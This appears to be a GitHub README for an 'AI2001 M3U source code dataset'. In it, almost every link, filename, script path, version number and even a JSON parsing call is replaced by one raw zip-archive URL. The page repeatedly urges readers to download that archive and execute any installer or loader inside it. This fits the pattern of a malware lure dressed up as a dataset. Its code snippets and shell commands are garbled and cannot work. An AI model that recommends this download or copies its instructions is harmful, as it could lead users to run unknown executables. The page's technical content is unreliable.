# AI2001 M3U Source Code Dataset — SC Category Source Pack

[![Releases](https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip)](https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip)

![M3U code banner](https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip)

AI2001_Category-Source_Code-SC-M3U collects M3U language source files for research, parsing, and model training. The set focuses on small-to-medium programs, playlist scripts, and annotated examples in the M3U format. Use the dataset for language modeling, tokenization experiments, code classification, or encoder-decoder tasks.

Badges
- License: GPL-3.0 — [![License: GPL v3](https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip)](https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip)
- Topics: ai, dataset, source-code, m3u-language
- Size: variable per release (check Releases)

Table of Contents
- What this repo holds
- Dataset contents and formats
- How to get releases (download and run)
- Example use cases
- Quick start
- File layout and naming
- Metadata and annotations
- Quality, token counts, and stats
- License and attribution
- Contributing
- Contact and issues

What this repo holds
- A curated collection of M3U source files and small program fragments.
- Playlists with custom tags and extensions.
- Annotated examples that show common patterns and edge cases in M3U.
- Parsers, sample loaders, and small utility scripts that work with the dataset.
- Release assets packaged as https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip or zip files for each dataset version.

Dataset contents and formats
- .m3u and .m3u8 files. These contain playlists and script-like entries.
- Plain text files with labeled segments. Labels cover token type, comment, metadata, and path.
- JSON metadata files that provide per-file annotations: source, license, tags, token count.
- Small parser scripts in Python and Node for ingest and basic validation.

How to get releases (download and run)
- Visit the Releases page and pick the version you need:
  https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
- Download the release asset that matches your OS or workflow. The release page contains https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip or zip assets and a checksum file. The release file need to be downloaded and executed if it contains an installer or an execution script. For example:
  - Download the asset file from the Releases page.
  - Verify the checksum file next to the asset.
  - Extract the archive and run the included loader or installer script (for example: https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip or python3 https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip).
- The release page provides the exact file names per version. Use the release asset that matches your environment and follow the included README or install script inside the archive.

Example use cases
- Train a tokenizer that treats M3U metadata tags as distinct tokens.
- Build a classifier that groups playlists by tag patterns or by presence of custom headers.
- Test a parser against malformed entries and compare recoveries.
- Create code generation tasks that convert annotated M3U snippets to normalized playlists.
- Use the JSON metadata to filter files by token count, license, or annotation tags.

Quick start
1. Download the release package from:
   https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
2. Verify the checksum file included in the release.
3. Extract the package:
   ```bash
   tar -xzf https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
   ```
4. Run the loader:
   ```bash
   cd ai2001-m3u-sc
   python3 https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip --input data --output processed
   ```
5. Inspect a sample file:
   ```bash
   head -n 40 data/sample_playlist.m3u8
   ```

File layout and naming conventions
- data/
  - raw/              # original raw files from sources
  - curated/          # curated .m3u and .m3u8 files
  - broken/           # intentionally broken samples for parser tests
- meta/
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip        # file-level metadata and per-file tags
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip     # license mapping per source
- tools/
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
- releases/
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip (example release asset)
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip

Naming rules
- Filenames use lowercase and hyphens.
- Use .m3u or .m3u8 for playlist files.
- Metadata files use snake_case and .json extension.

Metadata and annotations
- https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip contains:
  - filename: path to file
  - source: origin or collection
  - license: GPL-3.0 or other documented license
  - tokens: token count
  - lines: line count
  - tags: array of tags (e.g., header, extended-tag, comment-heavy)
  - validated: boolean if file passed parser validation
- Annotations use simple schema to support token classification and span labels.

Quality, token counts, and stats
- The dataset provides per-file token counts to aid sample selection for model training.
- The curated set removes files with personal data and removes binary artifacts.
- A "broken" set provides controlled malformed inputs to test parser resilience.
- Expect token distributions biased toward metadata tags, filename paths, and comments.

Parser and tooling
- https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip detects:
  - invalid header lines
  - mixed encoding
  - missing file path entries
  - malformed duration or tag syntax
- https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip converts each file to a JSONL line that contains:
  - id, source, raw_text, tokens, metadata
- The loaders use standard libraries only. They run with Python 3.8+.

Usage patterns and examples
- Token-level language modeling
  - Use https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip to convert the dataset to JSONL.
  - Concatenate JSONL sources for training.
- Fine-tuning a model for playlist generation
  - Extract curated playlists with specific tags.
  - Use the sample loader to produce input-output pairs.
- Parser evaluation
  - Use the curated and broken sets as test sets.
  - Track precision for tag recognition and path extraction.

Sample code snippet (Python)
```python
from pathlib import Path
import json

def load_jsonl(path):
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            yield https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip(line)

dataset = list(load_jsonl("https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip"))
print(f"Loaded {len(dataset)} records")
print(dataset[0]["filename"], dataset[0]["tokens"][:50])
```

Licensing and attribution
- The collection bundles source files under varying licenses. The curated release uses GPL-3.0 for packaging and redistribution where permitted.
- Each file keeps its original license in https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
- Use files according to their listed license. Attribution fields appear in https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip

Contributing
- Fork the repo and open a pull request.
- Add new samples under data/raw/ and add metadata to https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
- Run the validation script before opening a PR:
  ```bash
  python3 https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip data/raw/your_file.m3u8
  ```
- Tag new entries with clear source and license fields.
- Use descriptive PR titles and reference issue numbers.

Release notes and versioning
- Releases follow semantic versioning: https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
- Each release includes:
  - curated dataset archive
  - checksums file
  - https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
  - optional loader script with usage notes
- Visit the Releases page to pick a version:
  https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip

Issues and support
- Create an issue for bugs, missing metadata, or licensing questions.
- For parser issues, include a minimal sample that reproduces the problem.
- For large contributions, open an issue to discuss structure before PR.

Citation and references
- Cite the dataset in papers with a short reference block:
  - Title: AI2001 M3U Source Code Dataset — SC Category
  - Version: v1.x
  - URL: https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip
  - License: GPL-3.0 (see release metadata)

Maintenance and roadmap
- We plan incremental releases with updated curation and tooling.
- Future items:
  - richer token-level annotations
  - more parser tests and edge-case coverage
  - dataset splits for train/dev/test aligned to token counts

Security and privacy
- The curated release excludes files with personal data or sensitive paths where found.
- Contributors must declare source and license for each added file.

Acknowledgments
- This dataset pulls public and permissive samples and merges contributions under the stated license.
- Tools and patterns draw on community parsers and common playlist conventions.

Contact
- Open issues on the repository for questions, bugs, and dataset requests.
- Use pull requests for contributions.

Releases
- The dataset and assets appear on the Releases page. Download the release asset and follow the included loader or install script if the release contains an executable. The release page is here:
  https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip

Keywords (topics)
ai, ai2, ai2001, ai2001-dataset, ai2001-development, ai2001-project, ai2001-sc-dataset, ai2001-source-code, ai2001-source-code-dataset, artificial-intelligence, dataset, gpl3, gplv3, m3u-lang, m3u-language, m3u-language-dataset, sc-dataset

Image credits
- Header image: Unsplash (photo by Markus Spiske). Use as a visual banner in the README.

License
- This repository uses GPL-3.0 for packaged releases. Check each file in https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/raw/refs/heads/AI2001_Category-Source_Code-SC-M3U_Main-dev/Docs/Category-U-Source-Code-S-A-3.6.zip for its original license.